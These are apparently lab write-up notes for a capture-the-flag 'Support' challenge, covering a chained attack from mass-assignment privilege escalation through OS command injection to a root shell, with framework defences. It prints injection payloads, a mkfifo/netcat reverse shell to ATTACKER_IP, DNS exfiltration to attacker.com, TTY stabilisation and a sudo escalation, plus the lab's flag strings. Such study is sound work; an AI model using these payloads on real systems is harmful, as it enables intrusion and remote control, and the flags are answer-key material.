# Advanced Engineering Notes & Deep Dive: Support Challenge & Chained Web Exploitation

---

## 1. Threat Modeling of IT Operations & Support Platforms

Internal helpdesk, ticketing, and support platforms represent high-value targets in corporate network environments. Because they are often considered "internal" or "administrative tools," software development teams frequently lower their defensive rigor, introducing dangerous anti-patterns:

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        SUPPORT PLATFORM THREAT MODEL MATRIX                            │
│                                                                                        │
│  [ Operational Capability ]           [ Inherent Architectural Risk ]                  │
│                                                                                        │
│  1. Profile & Account Management      ➔ Mass Assignment / Parameter Tampering          │
│     (Self-service settings)             (CWE-915: Auto-binding client JSON to ORM)     │
│                                                                                        │
│  2. Diagnostic Tools (Ping, DNS)      ➔ OS Command Injection / Arbitrary Execution     │
│     (Helpdesk network testing)          (CWE-78: Passing unsanitized input to shell)   │
│                                                                                        │
│  3. Server Management Scripts         ➔ Insecure Sudoers Misconfigurations            │
│     (Automated operational scripts)     (CWE-250: Unrestricted root execution)         │
│                                                                                        │
│  4. Internal API Endpoints            ➔ Broken Object Level Authorization (BOLA)       │
│     (Cross-tenant ticket viewing)       (CWE-639: Missing resource-level auth checks)  │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Anatomy of the Chained Exploitation Pipeline

In red teaming and modern offensive penetration testing, achieving Remote Code Execution (RCE) on a hardened server rarely relies on a single trivial vulnerability. Instead, the assessment follows a multi-stage **Exploit Chain**:

```
   [ Phase 1: Reconnaissance & Mapping ]
   Service fingerprinting (Port 80/Apache, Port 22/SSH).
   Register unprivileged user ➔ intercept profile management API requests.
                    │
                    ▼
   [ Phase 2: Mass Assignment Privilege Escalation ]
   Abuses unrestricted ORM binding on PATCH /api/users/profile.
   Injects {"role": "admin"} ➔ server upgrades user account to Administrator.
   Accesses Admin Management Portal ➔ [ CAPTURES FLAG 1: THM{I_AM_ADMIN999} ]
                    │
                    ▼
   [ Phase 3: Administrative Attack Surface Expansion ]
   Explores administrative diagnostics console (/admin/diagnostics).
   Discovers network ping diagnostic tool executing backend shell utilities.
                    │
                    ▼
   [ Phase 4: OS Command Injection & Reverse Shell Weaponization ]
   Injects command delimiters (127.0.0.1; mkfifo /tmp/f...).
   Catches interactive reverse shell on Port 4444 as user: ubuntu.
                    │
                    ▼
   [ Phase 5: Looting & User Flag Capture ]
   Inspects local user home directory (/home/ubuntu).
   Reads user.txt ➔ [ CAPTURES FLAG 2: THM{GOT_THE_FLAG001} ]
                    │
                    ▼
   [ Phase 6: Local Privilege Escalation ]
   Audits sudo capabilities (sudo -l).
   Executes sudo /bin/bash ➔ Achieves full root (#) host takeover.
```

---

## 3. Deep Dive: Mass Assignment (Auto-Binding) Vulnerabilities

### The Underlying Mechanism
Mass assignment occurs when software frameworks automatically bind HTTP request parameters (whether from form data or JSON payloads) directly to backend data models or internal object properties without filtering or schema whitelisting.

```
Attacker Request:
PATCH /api/users/profile
{ "name": "Pentester", "role": "admin" }
           │
           ▼
Vulnerable Controller:
User.findByIdAndUpdate(userId, req.body); // Blindly takes all fields!
           │
           ▼
Database Object State:
{ id: 14, name: "Pentester", role: "admin", verified: true } ➔ PRIVILEGE ESCALATION ACHIEVED!
```

### Framework Comparison & Defense Patterns

| Framework / Language | Vulnerable Anti-Pattern | Secure Defensive Pattern |
|---|---|---|
| **Node.js / Express** | `User.update(req.body)` | `const { name, bio } = req.body; User.update({ name, bio })` |
| **Python / Django** | `form = UserForm(request.POST)` without `fields` restriction | Explicit `fields = ['name', 'bio']` inside `Meta` class |
| **PHP / Laravel** | `User::create($request->all())` with `$guarded = []` | Strict `$fillable = ['name', 'bio']` in Eloquent Model |
| **Java / Spring Boot** | Accepting entity `@RequestBody User user` directly | Using dedicated Data Transfer Objects (`@RequestBody UserUpdateDTO dto`) |

---

## 4. Deep Dive: OS Command Injection Mechanics & Evasion

### Shell Metacharacters & Delimiters
When application code invokes an operating system command via an unquoted shell (such as `/bin/sh -c` or `cmd.exe /c`), specialized characters instruct the shell interpreter to parse subsequent strings as independent commands:

| Delimiter | Execution Behavior | Example Payload |
|:---:|---|---|
| `;` | Sequential execution: runs Command 2 regardless of Command 1 status | `127.0.0.1; id` |
| `&&` | Conditional AND: runs Command 2 only if Command 1 succeeds (`exit 0`) | `127.0.0.1 && id` |
| `\|\|` | Conditional OR: runs Command 2 only if Command 1 fails (`exit != 0`) | `invalid_ip \|\| id` |
| `\|` | Pipe: routes stdout of Command 1 to stdin of Command 2 | `127.0.0.1 \| whoami` |
| `$(...)` | Command substitution: evaluates inner expression and replaces with output | `ping $(whoami).attacker.com` |
| `` `...` `` | Backtick substitution: evaluates command within the shell | `ping \`whoami\`.attacker.com` |
| `\n` (`%0a`) | Newline delimiter: starts a new command line in POSIX shells | `127.0.0.1%0aid` |

### Reverse Shell Weaponization (Named Pipe / Mkfifo)
When traditional `nc -e /bin/sh` or `-e /bin/bash` is disabled (often compiled out of OpenBSD Netcat variants on modern Linux distributions like Ubuntu), the FIFO (First-In, First-Out) named pipe provides universal shell redirection:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

**Step-by-Step Architectural Mechanics:**
1. `rm /tmp/f`: Removes any pre-existing pipe file to prevent I/O blocking.
2. `mkfifo /tmp/f`: Creates a special named FIFO pipe in filesystem memory.
3. `cat /tmp/f`: Reads continuously from the named pipe.
4. `| /bin/sh -i 2>&1`: Pipes the input into an interactive shell, capturing both standard output and standard error.
5. `| nc ATTACKER_IP 4444`: Transmits the shell's output over a raw TCP socket to the attacker's listener.
6. `> /tmp/f`: Redirects all incoming network commands received from the attacker over the TCP socket back into the named pipe, closing the bidirectional feedback loop.

---

## 5. Linux Post-Exploitation & Sudo Privesc Verification

### TTY Stabilization Routine
A raw reverse shell lacks job control, command history (up/down arrows), tab autocompletion, and text editor support (nano, vim). Stabilizing into an interactive PTY is vital before performing privilege escalation:

```bash
# Step 1: Spawn Python pseudo-terminal
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the session
# Press Ctrl + Z

# Step 3: Configure local terminal to raw mode and foreground the shell
stty raw -echo; fg

# Step 4: Re-initialize terminal environment variables
reset
export TERM=xterm
export SHELL=bash
stty rows 38 columns 140
```

### Sudo Rights Enumeration (`sudo -l`)
In enterprise Linux environments, misconfigured `sudoers` rules (`/etc/sudoers`) allow non-root users to execute specific administrative binaries without entering a password (`NOPASSWD`).

- If the user has `(ALL : ALL) NOPASSWD: ALL`, any command can be executed as root:
  ```bash
  sudo /bin/bash
  ```
- If restricted to a specific binary (e.g. `/usr/bin/find`, `/usr/bin/vim`, `/bin/journalctl`), refer to **GTFOBins** to locate shell escapes or privilege escalation vectors.
